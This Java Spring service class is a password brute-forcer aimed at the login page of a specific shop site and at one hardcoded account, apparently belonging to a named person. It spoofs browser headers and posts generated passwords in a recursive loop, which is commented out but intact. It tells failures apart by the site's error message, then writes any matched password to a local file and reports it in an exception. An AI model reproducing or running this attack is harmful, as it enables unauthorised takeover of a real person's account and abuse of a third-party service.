package com.lsy.pc.service;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;

@Service
public class OPPOService {
    @Autowired
    private RestTemplate restTemplate;

    private static String err = "错误的用户名或密码！";
    String url = "http://shoppo.nesdo.cn/Login_Wap.aspx";
    HashMap<String, String> headers = new HashMap<>();
    HashMap<String, String> datas = new HashMap<>();

    {
        headers.put("Content-Type", "application/x-www-form-urlencoded");
        headers.put("Accept-Encoding", "gzip, deflate");
        headers.put("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
        headers.put("Cache-Control", "max-age=0");
        headers.put("Connection", "keep-alive");
        headers.put("Origin", "http://shoppo.nesdo.cn");
        headers.put("Referer", "http://shoppo.nesdo.cn/Login_Wap.aspx");
        headers.put("Upgrade-Insecure-Requests", "1");
        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36");
        datas.put("__EVENTTARGET", "");
        datas.put("__EVENTARGUMENT", "");
        datas.put("TbUser", "宋玲玲");
        datas.put("CmdLogin", "登录");
    }

    Connection connect = Jsoup.connect(url);


    public void checkPwd(String name, String parent) {
        if (parent.length() > 4) {
            return;
        }
//        List<String> pwdList = PwdUtils.getNextPwds(parent);
//        pwdList.forEach(p -> {
//            datas.put("TbPass", p);
//            try {
//                Connection connection = connect.headers(headers).data(datas);
//                Document post = connection.post();
//                Elements fonts = post.body().select("font");
//                boolean b = fonts.stream().anyMatch(f -> f.toString().contains(err));
//                if (b) {
//                    checkPwd(name, p);
//                } else {
//                    aaa(p,post);
//                }
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
//        });

    }

    private void aaa(String p,Document post) throws IOException {
        System.out.println(post);
        System.out.println(post.body());
        System.out.println("!!!!!!!!!!!!!!!!!!" + p);
        File file = new File("C:\\code\\pc\\src\\main\\resources\\txt\\aa.txt");
        file.exists();
        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(file));
        bufferedWriter.write(p);
        bufferedWriter.flush();
        bufferedWriter.close();
        throw new RuntimeException("密码为:" + p);
    }


}
